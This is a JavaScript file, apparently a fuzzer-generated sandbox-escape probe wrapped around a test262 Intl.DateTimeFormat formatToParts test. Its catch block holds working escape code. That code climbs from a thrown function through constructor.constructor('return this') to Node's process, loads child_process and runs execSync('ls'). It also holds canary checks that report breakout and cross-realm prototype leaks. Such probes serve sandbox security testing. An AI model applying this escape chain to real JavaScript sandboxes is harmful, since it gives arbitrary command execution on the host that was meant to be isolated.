try {
    var dtf = new Intl.DateTimeFormat(undefined, {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric'
    });
    function formatAsString(dtf, time) {
        let REPLACER = 23;
        return dtf.formatToParts(time).map(part => {
            throw () => {
                return () => {
                };
            };
            return part.value;
        }).join('');
    }
    var expected = formatAsString(dtf, 0);
    assert.sameValue(formatAsString(dtf, -0.9), expected, 'formatToParts(-0.9)');
    assert.sameValue(formatAsString(dtf, -0.5), expected, 'formatToParts(-0.5)');
    assert.sameValue(formatAsString(dtf, -0.1), expected, 'formatToParts(-0.1)');
    assert.sameValue(formatAsString(dtf, -Number.MIN_VALUE), expected, 'formatToParts(-Number.MIN_VALUE)');
    assert.sameValue(formatAsString(dtf, -0), expected, 'formatToParts(-0)');
    assert.sameValue(formatAsString(dtf, +0), expected, 'formatToParts(+0)');
    assert.sameValue(formatAsString(dtf, Number.MIN_VALUE), expected, 'formatToParts(Number.MIN_VALUE)');
    assert.sameValue(formatAsString(dtf, 0.1), expected, 'formatToParts(0.1)');
    assert.sameValue(formatAsString(dtf, 0.5), expected, 'formatToParts(0.5)');
    assert.sameValue(formatAsString(dtf, 0.9), expected, 'formatToParts(0.9)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}